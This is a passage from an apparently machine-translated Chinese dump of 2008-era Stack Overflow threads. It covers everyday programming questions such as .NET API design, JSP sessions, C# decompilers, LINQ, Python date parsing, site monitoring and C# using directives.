*   风格警察规则是**建议**，**而不是** **法律**，打破它们归结为对情况带来最大好处的推理：遵循规则并保持标准和熟悉，或者，或因您的情况所要求的特定原因而违反规则并从中获得其他好处这样做。

*   规则改变。必须有一些东西来推动改变。

因此，如果 Microsoft MVC 团队认为这样做是件好事，他们可以自由地成为 Style cop 不兼容者。

PS 无缘无故地打破规则从来都不是一件好事。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-18T15:58:35.267

Visual Studio 中的大多数（如果不是全部）Microsoft 模板都不是样式复制投诉。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-03-09T21:46:47.310

您也可能会问为什么大多数 Microsoft 应用程序不遵循 Microsoft 可用性指南。

MS是一家大公司，和所有大公司一样，他们通常不遵守自己的规则。

# .net - .NET API 中的字符串或 URI？

> ID：214746
> 
> 赞同：11
> 
> 时间：2008-10-18T08:19:35.507
> 
> 标签：.net, api-design

我正在为 Netflix API 编写一个 .NET 包装器 API。

此时我可以选择将 URL 表示为字符串或 URI 对象。在我看来，两者都有很好的案例。

因此，如果您使用的是 API，您更喜欢哪一个？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2008-10-18T08:36:19.310

以下引用来自：[框架设计指南](https://rads.stackoverflow.com/amzn/click/com/0321246756)
我**强烈**推荐这本书给任何在 .Net 上开发框架的人

> **请务必使用**System.Uri 来表示 URI / URL 数据。
> （对于参数、属性和返回值）
> 
> System.Uri 是一种更安全、更丰富的 URI 表示方式。使用纯字符串对 URI 相关数据的广泛操作已被证明会导致许多安全性和正确性问题。
> 
> **考虑**使用 System.Uri 参数为最常用的成员提供基于字符串的重载。
> 
> 如果从用户那里获取字符串的使用模式足够普遍，您应该考虑添加一个接受字符串的便利重载。基于字符串的重载应该按照基于 Uri 的重载来实现。
> 
> **不要**使用接受字符串的版本自动重载所有基于 Uri 的成员。
> 
> 通常，首选基于 Uri 的 API。基于字符串的重载旨在为最常见的场景提供帮助。因此，您不应自动为基于 Uri 的成员的所有变体提供基于字符串的重载。有选择性，只为最常用的变体提供此类帮助程序。

**编辑（根据评论）：**该书特别指出：**“使用纯字符串对 URI 相关数据的广泛操作已被证明会导致许多安全性和正确性问题。”** 我不确定使用 System.Uri / UriBuilder 需要什么额外的理由。此外，您为什么不想利用框架来读取/操作 URI？

在设计将被其他人使用的 API 时，重要的是要使它们易于**使用且可靠**。出于这个原因，本书确实提到，您应该为常见功能提供“不错的”重载。但是，为了确保正确性，您应该始终使用 URI 实现底层代码。

您能否阐明您的需求或仅使用字符串的原因？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-18T09:05:41.140

I would say that you should represent it as URI. However, if I am a user of your API and I am having to continuously convert string based URLs to URI to use your API, then I would be a pissed off user.

What I am saying is that you need to assess what kind of audience will be consuming your API.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-18T09:13:21.000

One thing I found was that while writing `string`-accepting methods, I'd always have to initialize a `Uri` object anyway just to validate the string, such that the `UriFormatException` would then propagate out of the method if the user passed a bad string. But if you accept `Uri`s only, as I did after getting yelled at (rightfully) by FxCop, then you always know your input is valid---which to me seems like a very good sign that you're designing your API correctly.

# java - 在 JSP 之间传递参数

> ID：214748
> 
> 赞同：2
> 
> 时间：2008-10-18T08:20:32.010
> 
> 标签：java, database, jsp, jsf, netbeans

请耐心等待，我是一名学生，并且是 Java Server Pages 的新手。如果我是个彻头彻尾的白痴，谁能给我一个关于 JSP 教程的好链接，因为我无法在任何地方找到这方面的信息。

好的，这就去...

我正在使用 Netbeans 并尝试在页面之间传递一个连接到数据库的对象，否则每次显示新页面时我都必须重新连接到数据库。

使用 Netbeans，您可以在“设计”视图中以“jsp”的形式查看每个页面，或者查看 Java 代码。在 Java 代码中是扩展 AbstractPageBean 的类。问题是我想传递参数，但没有代表类的对象，所以我不能只访问实例变量。

谁能告诉我该怎么做？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-18T10:01:35.923

您可以将它放在会话[JSP 教程 Sessions](http://www.jsptut.com/Sessions.jsp)中。

但坦率地说，您不会将数据库连接放在会话中。它们是稀缺资源。您最好使用一些池机制，例如[Tomcat JNDI 数据库池示例](http://www.informit.com/articles/article.aspx?p=336708&seqNum=5)。

我个人会将所有 Java 代码放在一个类中并使用该类：

爪哇：

```
public class FooRepo {
    public static Foo getFoo(Long id) {
      // Read resultSet into foo
    }
  } 
```

jsp：

```
Foo = FooRepo.getFoo( id as stored in JSP );
// display foo 
```

如果您开始使用 JSP，我强烈建议您使用一本书。创建一个可以工作的 JSP 非常非常容易，但创建一个可读、可维护的 JSP 却很难。将 JSP 用于视图，而不是用于逻辑。

至于什么书；去书店。我个人喜欢核心java系列和Head First系列。最后一个系列*很*容易理解，但也很透彻。

我知道一本书很昂贵，但投资一本书将帮助您了解基础知识，如果您转向 struts、spring-mvc、wicket、JSF 或您将来将使用的任何其他框架，这将对您有所帮助。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-18T17:39:50.770

[http://java.sun.com/j2ee/1.4/docs/tutorial/doc/index.html](http://java.sun.com/j2ee/1.4/docs/tutorial/doc/index.html)是一个 J2EE 教程，其中部分内容还讨论了 JSP

来自 sun 的另一个 JSP 教程：http: [//java.sun.com/j2ee/tutorial/1_3-fcs/doc/JSPIntro.html](http://java.sun.com/j2ee/tutorial/1_3-fcs/doc/JSPIntro.html)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-18T19:53:52.623

我[赞同关于 JSP 和 Servlets 的 Head First 书籍](https://rads.stackoverflow.com/amzn/click/com/0596516681)的建议。不要被可爱的演示吓到，它非常透彻，信息呈现的方式非常有效，既易于学习，又有助于“坚持”。

您可以考虑参加[Sun Java Web Component Developer 认证](http://www.sun.com/training/certification/java/scwcd.xml)考试，这是强迫自己彻底学习材料的好方法。不幸的是，您需要先获得 Sun Java 程序员认证。

# c# - 与 Visual Studio 集成的 C# 的最佳（免费？）反编译器？

> ID：214764
> 
> 赞同：18
> 
> 时间：2008-10-18T08:38:32.410
> 
> 标签：c#, visual-studio, decompiling

在我的 Java 开发中，我从[Jad/JadClipse](http://en.wikipedia.org/wiki/JAD_%28JAva_Decompiler%29)反编译器中受益匪浅。这使得*知道*第三方库失败的原因成为可能，而不是通常的猜测。

我正在为 C# 和 Visual Studio 寻找类似的设置。也就是说，我可以在我的代码中指向任何类或变量并获取该特定类的代码视图的设置。

什么是最好的设置？我希望能够使用常用的“跳转到声明/实现”来导航我自己的代码。它不一定*是*免费的，但如果它是免费的，那将是一个奖励。

它应该支持 Visual Studio 2008 或 Visual Studio 2005 以及 .NET 2 和 3(.5)。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2008-10-18T09:02:45.310

这是一篇关于[Reflector 以及如何将 Reflector 集成到 Visual Studio](http://en.csharp-online.net/Visual_Studio_Hacks%E2%80%94Hack_64:_Examine_the_Innards_of_Assemblies)的好文章。

> 特别感兴趣的是 Reflector.VisualStudio 插件。这个由 Jaime Cansdale 创建的加载项允许在 Visual Studio 中托管 Reflector。使用此加载项，您可以将 Reflector 集成到 Visual Studio 环境中。
> 
> 要开始使用，您需要在您的机器上安装最新版本的 Reflector。下载 Reflector 后，从 [http://www.testdriven.NET/reflector](http://www.testdriven.NET/reflector)下载最新版本的 Reflector.VisualStudio 插件。下载包含许多文件，需要将它们放在与 Reflector.exe 相同的目录中。要安装加载项，请拖放到命令行并运行：
> 
> ```
> Reflector.VisualStudio.exe /install 
> ```
> 
> 安装插件后，您可以从 Visual Studio 开始使用 Reflector。您会注意到一个新的菜单项 Addins，其中有一个名为 Reflector 的菜单选项。选中此选项后，将显示反射器窗口，该窗口可以停靠在 IDE 中。此外，该插件还提供上下文菜单支持。
> 
> 在 Visual Studio 中右键单击打开的代码文件时，您将看到一个 Reflector 菜单项，该菜单项扩展为一个子菜单，其中包含将代码反汇编为 C# 或 Visual Basic、显示调用图或被调用图以及其他相关选项的选项选择。上下文菜单还包括一个 Synchronize with Reflector 菜单项，单击该菜单项时，会将 Reflector 窗口中的对象浏览器树与当前代码文件同步。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2011-08-06T23:07:23.213

试试开源软件[http://ilspy.net/](http://ilspy.net/)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-04-14T20:14:46.027

如果您碰巧使用该工具，Scout 插件会将 Reflector 与 ReSharper 集成在一起[。](http://code.google.com/p/scoutplugin/)

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2011-05-18T07:20:29.193

ReSharper 6（目前[可供](http://confluence.jetbrains.net/display/ReSharper/ReSharper+6.0+Nightly+Builds)抢先体验）支持在 Visual Studio 中进行反编译，整个 ReSharper 的导航功能包都适用于反编译的代码。我们前段时间[在博客上写过这个。](http://blogs.jetbrains.com/dotnet/2011/02/resharper-6-bundles-decompiler-free-standalone-tool-to-follow/)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-05-30T12:30:00.670

我认为[dotPeek是](http://www.jetbrains.com/decompiler/)**反编译 C#** 代码和**.Net**程序集的最佳**免费**工具

 ***** * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-10-18T08:42:51.637

我不认为它可以与 Visual Studio 集成，但[Reflector](http://www.red-gate.com/products/reflector/ "反射器")可以将 .NET 程序集反汇编成多种 .NET 语言，或者显示 IL。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-10-18T08:57:38.567

Remotesoft 的**[Salamander .NET 反编译](http://www.remotesoft.com/salamander/index.html)**器没有集成到 Visual Studio 中，但它可以**生成 Visual Studio .NET 项目文件**以便于重新编译。它不是免费的。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2008-10-18T08:58:16.100

只需在文件夹中的 DLL/EXE 上使用“打开方式”`bin`并选择 Reflector（并设置为默认值），即可将 .NET Reflector 附加到 Visual Studio。此外，许多工具（如果我记得的话，比如[TestDriven.NET ，可能还有 ReSharper）提供了一定程度的 .NET Reflector 集成。](http://www.testdriven.net/)

# c# - 如何将此代码组合成一个或两个 LINQ 查询？

> ID：214772
> 
> 赞同：5
> 
> 时间：2008-10-18T08:44:51.757
> 
> 标签：c#, linq, linq-to-xml

我可能有点懒在这里问这个问题，但我才刚刚开始使用 LINQ，而且我有一个函数，我确信可以将其转换为两个 LINQ 查询（或一个嵌套查询），而不是一个 LINQ 和一对foreach 语句。任何 LINQ 大师都愿意为我重构这个作为示例吗？

该函数本身循环遍历 .csproj 文件列表并提取项目中包含的所有 .cs 文件的路径：

```
static IEnumerable<string> FindFiles(IEnumerable<string> projectPaths)
{            
    string xmlNamespace = "{http://schemas.microsoft.com/developer/msbuild/2003}";
    foreach (string projectPath in projectPaths)
    {
        XDocument projectXml = XDocument.Load(projectPath);
        string projectDir = Path.GetDirectoryName(projectPath);

        var csharpFiles = from c in projectXml.Descendants(xmlNamespace + "Compile")
                              where c.Attribute("Include").Value.EndsWith(".cs")
                              select Path.Combine(projectDir, c.Attribute("Include").Value);
        foreach (string s in csharpFiles)
        {
            yield return s;
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-10-18T08:55:20.350

怎么样：

```
 const string xmlNamespace = "{http://schemas.microsoft.com/developer/msbuild/2003}";

        return  from projectPath in projectPaths
                let xml = XDocument.Load(projectPath)
                let dir = Path.GetDirectoryName(projectPath)
                from c in xml.Descendants(xmlNamespace + "Compile")
                where c.Attribute("Include").Value.EndsWith(".cs")
                select Path.Combine(dir, c.Attribute("Include").Value); 
```

# python - 如何在 Python 中将 YYYY-MM-DDTHH:mm:ss.000Z 时间格式转换为 MM/DD/YYYY 时间格式？

> ID：214777
> 
> 赞同：42
> 
> 时间：2008-10-18T08:53:02.897
> 
> 标签：python, datetime

例如，我正在尝试将 2008-09-26T01:51:42.000Z 转换为 09/26/2008。完成此任务的最简单方法是什么？

* * *

## 回答 #1

> 赞同：51
> 
> 时间：2008-10-18T17:33:30.410

最简单的方法是使用[dateutil](http://labix.org/python-dateutil) .parser.parse() 将日期字符串解析为可识别时区的 datetime 对象，然后使用 strftime() 获取所需的格式。

```
import dateutil.parser

d = dateutil.parser.parse('2008-09-26T01:51:42.000Z')
print(d.strftime('%m/%d/%Y'))  #==> '09/26/2008' 
```

* * *

## 回答 #2

> 赞同：37
> 
> 时间：2016-08-25T21:30:54.400

我知道这确实是个老问题，但是您可以使用 python datetime.strptime()

```
>>> from datetime import datetime
>>> date_format = "%Y-%m-%dT%H:%M:%S.%fZ" 
>>> datetime.strptime('2008-09-26T01:51:42.000Z', date_format)
datetime.datetime(2008, 9, 26, 1, 51, 42) 
```

* * *

## 回答 #3

> 赞同：21
> 
> 时间：2008-10-18T09:01:59.850

```
>>> import time
>>> timestamp = "2008-09-26T01:51:42.000Z"
>>> ts = time.strptime(timestamp[:19], "%Y-%m-%dT%H:%M:%S")
>>> time.strftime("%m/%d/%Y", ts)
'09/26/2008' 
```

有关更多信息，请参阅 Python[`time`](http://python.org/doc/2.5/lib/module-time.html)模块的文档。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-10-18T14:13:19.553

`2008-09-26T01:51:42.000Z`是一个 ISO8601 日期，格式可以非常多样化。如果您想解析这些日期，请参阅 python wiki on [working with time](http://wiki.python.org/moin/WorkingWithTime)。它包含一些有用的模块链接。

* * *

## 回答 #5

> 赞同：-3
> 
> 时间：2010-05-25T12:32:41.023

```
def datechange(datestr):
dateobj=datestr.split('-')
y=dateobj[0]
m=dateobj[1]
d=dateobj[2]
datestr=d +'-'+ m +'-'+y
return datestr 
```

你可以做一个这样的函数，它接受日期对象并以所需的日期格式返回你的日期......

# code-injection - 代码注入不好吗？

> ID：214802
> 
> 赞同：1
> 
> 时间：2008-10-18T09:14:57.313
> 
> 标签：code-injection

有一些相当强大的工具，如[SIMBL](http://www.culater.net/software/SIMBL/SIMBL.php)或Airfoil [/Instant Hijack](http://rogueamoeba.com/airfoil/mac/index.php)，它们使用代码注入。
据我了解，这些工具在其他程序中注入了自己的代码。这个想法对我来说听起来很危险，因为这似乎有可能使完全稳定的软件变得脆弱和“有缺陷”。这似乎也带来了安全风险。

出于稳定性或安全原因，是否应该避免使用这些工具？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-18T09:22:12.290

这取决于您使用它的目的以及所注入代码的质量。完全稳定的注入代码是可能的。事实上，在我之前开发第三方游戏反作弊软件时，代码注入是其中很大一部分，而且我经常能够通过消除原始游戏开发者从未修复的漏洞和漏洞来使游戏更加稳定。不再支持游戏。

另一方面，我可能对将第三方代码注入企业安全、审计或会计软件持怀疑态度。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-18T09:20:22.733

我相信它不仅仅指用于黑客或破解系统的[那种代码注入。](http://en.wikipedia.org/wiki/Code_injection)

它也是 java 世界中经常使用的一种技术，使用[AOP](http://en.wikipedia.org/wiki/Aspect-oriented_programming)或[IPojo](http://felix.apache.org/site/ipojo-concepts-overview.html)等工具。

当它们有意义时，它们会补充当前代码，从而允许它们：

*   在给定的框架内运行（IPojo 的 OSGI 声明式服务）
*   添加功能（AOP 的日志记录服务）

只要初始代码可以在没有代码注入的情况下运行，稳定性就不是问题。

稳定性和安全性——在代码注入的这两种善意用法的情况下——注入代码的稳定性和安全性应该在单独的测试代码中进行评估。

# vb6 - VB6.0 MDI Spell Checker

> ID：214805
> 
> 赞同：-1
> 
> 时间：2008-10-18T09:21:03.293
> 
> 标签：vb6, spell-checking

I have a VB6.0 project with MDI parent and child form. Now I need to check spelling and grammar in few text boxes on that child form.

Please help with code example.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-18T10:42:38.760

You could license a professional **ActiveX component** like [Tachyon's spellchecker](http://www.tachyon-labs.com/tachyonspell.aspx). I found a [list here](http://www.sharewareconnection.com/titles/spell-checker-component.htm).

If you could demand **Microsoft Word** installed on the client machine as prerequisit, you could use Word's spell checker:

```
Dim objWord As Object
Dim objDoc  As Object

Dim strResult As String

' // Create a new instance of word Application

Set objWord = CreateObject("word.Application")

Select Case objWord.Version
   ' // Office 2000
   Case "9.0"
      Set objDoc = objWord.Documents.Add(, , 1, True)

   ' // Office XP
   Case "10.0"
      Set objDoc = objWord.Documents.Add(, , 1, True)

   ' // Office 97
   Case Else ' Office 97
      Set objDoc = objWord.Documents.Add

End Select

objDoc.Content = Text1.Text
objDoc.CheckSpelling

strResult = Left(objDoc.Content, Len(objDoc.Content) - 1)

If Text1.Text = strResult Then
    ' // There were no spelling errors, so give the user a
    ' // visual signal that something happened

    MsgBox "The spelling check is complete.", vbInformation + vbOKOnly
End If 
```

You can find another good example in this article about how to [call the MS Word Spell Checker](http://www.thescarms.com/vbasic/spellcheck.aspx).

# web-applications - 您如何监控多个网站的可用性

> ID：214809
> 
> 赞同：7
> 
> 时间：2008-10-18T09:25:34.407
> 
> 标签：web-applications, website-monitoring

我需要确保任何数量的网站和服务都没有尘埃落定。目前，我依靠一个简单的 5 分钟 cronjob，它使用 curl 和一个 url 文件来检查所有响应是否正确（200 或很少 301）。

这一切都在基本层面上起作用，我对更复杂的开源工具（统计、响应时间、漂亮的图表）感兴趣——你用什么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-10-18T09:33:13.190

我自己没有使用过它，但我很确定我听说过[Nagios](http://www.nagios.org/)用相当热烈的术语来谈论它。值得一试？

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2008-10-18T10:30:57.083

以我的经验，nagios 工作得很好，但有时似乎很难照顾。如果您想在 nagios 为您提供的基础上获得统计信息和其他所有内容，请添加[cacti](http://www.cacti.net/)。如果你想把它全部放在一个包里，你应该看看[OpenNMS](http://www.opennms.org/)。要充分利用所有这些优势，您也应该使用 SNMP，这样您还可以查看内存、cpu、磁盘使用的详细信息。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-18T09:48:45.607

从经验来看，我会加倍使用 Nagios 的建议。我认为我没有找到比 Nagios 更好的开源工具来实现相同的目标。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-18T10:39:11.263

我会推荐 AdventNet ( [http://manageengine.adventnet.com/](http://manageengine.adventnet.com/) ) 的 ManageEngine。最多 5 个受监控的资源 iirc 是免费的。在免费版本之外，它相当便宜。

开箱即用 它知道如何监控 Web 服务、Web 服务器（各种类型，例如 IIS、Tomcat、Websphere（5 和 6）以及许多其他东西，例如从 MSSQL 和 DB2 本地提取性能数据。Web 服务可以是仅由“http-are-you-there”监控，但您也可以从 wsdl 规范中指定要发送的实际内容，因此您知道对方不仅响应，而且还能够处理记录。（当然这要求您以后有办法删除这些保持活动的数据记录，但这是一个不同的问题）。

对于每个受监控的系统，您可以为警报设置阈值，因此必须连续 5 次触发 SMS 警报或自动重新启动服务。

作为一个额外的好处，它拥有我所见过的最好的 SNMP 支持。

免费下载链接：http: [//manageengine.adventnet.com/products/applications_manager/download-free.html](http://manageengine.adventnet.com/products/applications_manager/download-free.html)

链接到演示：[http ://demo.appmanager.com/LoginPage.do](http://demo.appmanager.com/LoginPage.do)

（注：我不隶属于公司）

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-27T11:46:10.367

[Zabbix](http://www.zabbix.com/) 1.6 支持 Web 监控的多个流，并且允许您监控除此之外的其他内容。它是免费的而且非常灵活。

# c# - Powerwise：在 C#(.NET) 中使用控制台或 Windows GUI 应用程序更好吗？

> ID：214814
> 
> 赞同：0
> 
> 时间：2008-10-18T09:31:49.980
> 
> 标签：c#, windows, user-interface, console

如果我们正在写关于电源选项的文章 - 在 C#(.NET) 中使用基于控制台的应用程序比使用 Windows GUI 更好，除了在操作内存中加载的几个库之外，真正的区别是什么？

问题是关于文本比较和使用字符串、连接到 Internet、收集数据、使用数据库。

我的意思是权力能力，但正如我在这里所读到的，它更多的是关于控制而不是任何权力关系。谢谢 ：）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-18T09:35:22.467

我不完全确定您的要求是什么。GUI 往往比控制台应用程序更难编写，但提供了很高的可用性（如果你设计得好，这完全是另一回事）。

如果它是一个不需要交互性的简单工具：从一些命令行参数开始，处理并报告进度，完成 - 然后我会编写一个控制台应用程序。如果需要更多交互性，请选择 GUI。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-18T09:39:07.843

根据您的描述，您似乎想编写一个 HTML 抓取软件或某种网络蜘蛛。我认为您决定是编写 GUI 还是命令行应用程序应该取决于谁（用户）或哪些其他软件组件将使用或集成您的程序。

如果不涉及用户交互，我想将其编写为命令行程序就可以了。如果您有一些选项要设置，您可以将它们作为参数传递。

如果这将是一个重复的、孤立的工作，您还可以考虑将应用程序编写为**windows 服务**，它可以从机器开始。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-18T10:29:40.063

没有 GUI 的软件将有许多额外的时钟可用。显示 GUI 需要资源……在今天的计算机上，简单的 GUI 不会真正影响性能。

如果您希望拥有更好的计算能力，那么拥有多线程架构应该为您提供比控制台和 GUI 更多的功能。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-18T09:35:47.227

你可以用你提到的东西（字符串、互联网、数据库）做什么没有区别。控制台和 GUI 应用程序之间的区别仅在于您与用户交互的方式。其他一切都是一样的。

如果您的意思是功耗，那么恐怕我误解了您的问题。

# windows - 用于Windows开发的虚拟机使用什么软件？

> ID：214818
> 
> 赞同：1
> 
> 时间：2008-10-18T09:35:23.997
> 
> 标签：windows, macos, vmware, virtualization

作为程序员的副业，我需要 Windows。它将安装在 VMWare Fusion 中。我将主要编写 Matlab-Mex 文件的 C 代码、一些 DSP 开发、一些 C 和 C++ 中的简单命令行工具作为教程，并希望有一些使用 Visual Studio 的简单 GUI。我将使用 VisualDSP++、Bloodshed Dev-Cpp、Matlab mex 编译器和 Visual Studio。
虚拟机主要必须在 MacBook 2,1 GHz / 4 Gb 上运行。

现在这是我的问题：

*   我应该使用 Vista 还是 XP？我喜欢第一个更好，但担心性能，尤其是使用 Visual Studio。
*   我应该使用 Visual Studio 2008 Pro 还是 Express？我不想为我不使用的功能浪费内存。（== 专业版中有用于 GUI 开发的有用的东西吗？）

感谢您的意见！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-10-20T18:38:38.330

值得您花时间尝试[VirtualBox](http://virtualbox.org/wiki/Downloads)。它是免费的，VirtualBox 下的 Vista 和 XP 的速度令人震惊。我在 OS X 上的 VirtualBox 下运行 XP 和 Vista，它们的速度似乎接近原生速度。也许是因为在虚拟化环境中工作的驱动程序较少。

我通常在 Vista VM 上使用 512 兆内存，在 XP 上使用 256 兆内存。这样，您可以一次运行多个 VM，并且仍然有足够的系统 RAM 用于打开的浏览器等。

简单的命令行工具和简单的 GUI 可以使用 Visual Studio 的 Express 版本完成。坚持下去，直到你长大。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-04T03:37:53.670

Vista 将在该笔记本电脑上运行。

至于 Visual Studio 版本，Pro 能够编辑用于 C/C++ 开发的资源文件，因此您可以手动将控件拖放到适当位置。[尽管您可以改用名为ResEd](http://www.radasm.com/resed/index.html)的外部工具，但在 express 版本中已禁用此功能。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-18T09:38:32.680

好。你在那台 MacBook 上有 4gig 的内存，那么 Vista 应该没问题 - 如果你给它大约 2gig 的内存，在 VS 中甚至可能更快。

而关于Visual Studio的版本，那么Express应该会更好。工具中没有 GUI 差异（我知道，我只在 .NET 中工作，而不是在本机中工作）

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-18T13:59:57.270

如果您真的担心性能，您可以使用新兵训练营进行双重引导。除此之外，我相信 Parallels 支持训练营，因此您甚至可以虚拟化您的 Windows 分区。

话虽如此，如果您要进行虚拟化，我建议您使用 XP，纯粹是因为您无法利用图形硬件来获得 vista 中所有华丽的效果。如果您确实选择 vista，我建议您关闭 aero。

至于 Visual Studio 2008 的版本，你应该找出你需要它的用途（你表示你已经使用了 dev-c++）并选择支持你所有需要的功能的版本。虽然我在这里，但如果您正在寻找新的 IDE，我还建议您查看 eclipse 和 CDT。

最后一个提示，如果您想使用完整的 4Gb 内存，您将需要一个 64 位操作系统。

祝你好运。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-18T14:33:33.160

我也会选择 WinXP，**mdec**已经说过了，你将无法使用 Auro 界面，如果它只是用于开发，你不会错过“花哨”的功能...... WinXp 使用更少的资源和任何Mb 的 RAM 在此设置中很有用。

要回答 Vistual Studio 的问题，大多数时候 Express 版本就足够了，但对我来说，缺少的一个关键特性是对插件的支持......有许多很棒的插件可以提高你的工作效率，比如 ReSharper、GhostDoc、Mole 和更多...[见上一篇](https://stackoverflow.com/questions/2767/do-you-have-any-recommended-add-onsplugins-for-microsoft-visual-studio)

# c# - 我应该同意从我的 C# 项目中禁止“使用”指令吗？

> ID：214825
> 
> 赞同：25
> 
> 时间：2008-10-18T09:39:11.883
> 
> 标签：c#, .net

我的同事坚持在代码中明确指定命名空间，而不是使用[using 指令](http://msdn.microsoft.com/en-us/library/sf0df423.aspx)。换句话说，他希望每次在代码中出现每种类型时都使用完全限定名称。就像是

```
public class MyClass
{
    public static void Main()
    {
        System.Console.WriteLine("Foo");
    }
} 
```

代替：

```
using System;
public class MyClass
{
    public static void Main()
    {
        Console.WriteLine("Foo");
    }
} 
```

你可以想象后果。

他给出的优点：

1.  将代码复制并粘贴到其他源文件中更简单。
2.  它更具可读性（您会立即看到命名空间）。

我的缺点：

1.  我必须写更多
2.  代码可读性较差（我猜 de gustibus non disputandum est）
3.  没有人这样做！

你怎么看待这件事？

* * *

## 回答 #1

> 赞同：65
> 
> 时间：2008-10-18T09:44:06.477

如果您需要复制和粘贴代码以真正受益于拥有完全限定的类型，那么您就会遇到更大的问题。

此外，您是否打算记住每个类所在的命名空间以便能够完全限定其类型？

* * *

## 回答 #2

> 赞同：48
> 
> 时间：2008-10-18T10:37:19.440

对于稍微不同的答案：LINQ。

扩展方法只能通过“使用”语句获得。所以无论是查询语法还是流畅的界面都*只能*与正确的“使用”语句一起使用。

即使没有 LINQ，我也会说使用“使用”...推理您可以用更少的字符理解的越多越好。一些命名空间非常深，但不会为您的代码增加任何价值。

还有其他扩展方法（不仅仅是 LINQ）也会受到同样的影响；当然，您可以使用静态类，但流畅的界面更具表现力。

* * *

## 回答 #3

> 赞同：37
> 
> 时间：2008-10-18T10:11:52.627

我怎么看这件事？

我认为，如果一个人会提出这样的想法，并且会以他的方式证明它的合理性，那么他很可能对 C# 语言和 .NET 开发有许多其他基本的误解。

* * *

## 回答 #4

> 赞同：23
> 
> 时间：2008-10-18T17:14:57.093

你的同事说“复制和粘贴代码”的那一刻，他就失去了所有可信度。

* * *

## 回答 #5

> 赞同：19
> 
> 时间：2008-10-18T12:57:06.600

我发现不使用“使用”指令的最大问题不是实例化和类的定义。它将值传递给在命名空间中定义的函数。比较这两段代码（VB.Net，因为这是我所知道的，但你明白了）。

```
Module Module1

    Sub Main()
        Dim Rgx As New System.Text.RegularExpressions.Regex("Pattern", _
            System.Text.RegularExpressions.RegexOptions.IgnoreCase _
            Or System.Text.RegularExpressions.RegexOptions.Singleline _
            Or System.Text.RegularExpressions.RegexOptions.IgnorePatternWhitespace)

        For Each result As System.Text.RegularExpressions.Match In Rgx.Matches("Find pattern here.")
            'Do Something
        Next
    End Sub

End Module 
```

还有这个

```
Imports System.Text.RegularExpressions

Module Module1

    Sub Main()
        Dim Rgx As New Regex("Pattern", _
            RegexOptions.IgnoreCase _
            Or RegexOptions.Singleline _
            Or RegexOptions.IgnorePatternWhitespace)

        For Each result As Match In Rgx.Matches("Find pattern here.")
            'Do Something
        Next
    End Sub

End Module 
```

在这种使用大量枚举的情况下，以及在 for 循环中内联声明变量以缩小范围，在 vb.Net 的情况下不使用“使用”或“导入”，可能会导致非常糟糕的可读性.

* * *

## 回答 #6

> 赞同：9
> 
> 时间：2008-10-18T10:07:45.163

通过复制和粘贴来更容易地移动代码只是[不合逻辑](http://en.wikipedia.org/wiki/Non_sequitur_(logic))的，很可能是潜在危险做法的警告信号。代码的结构和易读性不应由易于编辑决定。

如果有的话，它会降低代码的可读性和更具体 - 我个人对标准对象的位置不感兴趣，这类似于用他们的完整名字来称呼你的同事，并以你工作场所的街道地址为前缀。

然而，有时它偶尔会使代码更具可读性，因此硬性和快速规则不适用，只是常识。

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2008-10-18T09:45:50.387

因为我们在 C# 中有一个用于自动设置 using 语句的工具，通过按`Ctrl`+ `**.**`- 我看不出有任何不使用它的理由。这里的另一个“酷”的事情是：

想想你有两个命名空间：

控制台命名空间1

和

控制台命名空间2

两者都有一个控制台类。现在，您只需一行代码即可更改对 ConsoleNamespace2 的所有引用 - 这很酷。

我的建议：`using`如果可以，请使用，如果必须，请使用完整。我不认为是完整的，如果更容易阅读的话。了解你的框架，这永远不会成为问题。

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2008-10-18T10:22:23.760

还值得注意的是，像 ReSharper 这样的工具（你为什么还没有使用它？）会自动为你添加适当的“使用”行。

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2008-10-18T10:47:45.053

您使用“使用”的原因之一是它告诉任何阅读源代码的人您的班级将要做的事情。例如，使用 System.IO 可以告诉读者您正在执行 I/O 操作。

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2008-10-18T09:46:00.310

好家伙。一个步骤可能是教你的同事`Ctrl`+`.`它会自动为你插入 using 语句。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2008-10-18T10:05:09.023

我的一般规则是，如果我要多次使用特定命名空间中的项目，它会得到一个 using 指令。但是，对于我只使用一次或两次的东西，我不想使用指令来弄乱文件的顶部。

* * *

## 回答 #12

> 赞同：1
> 
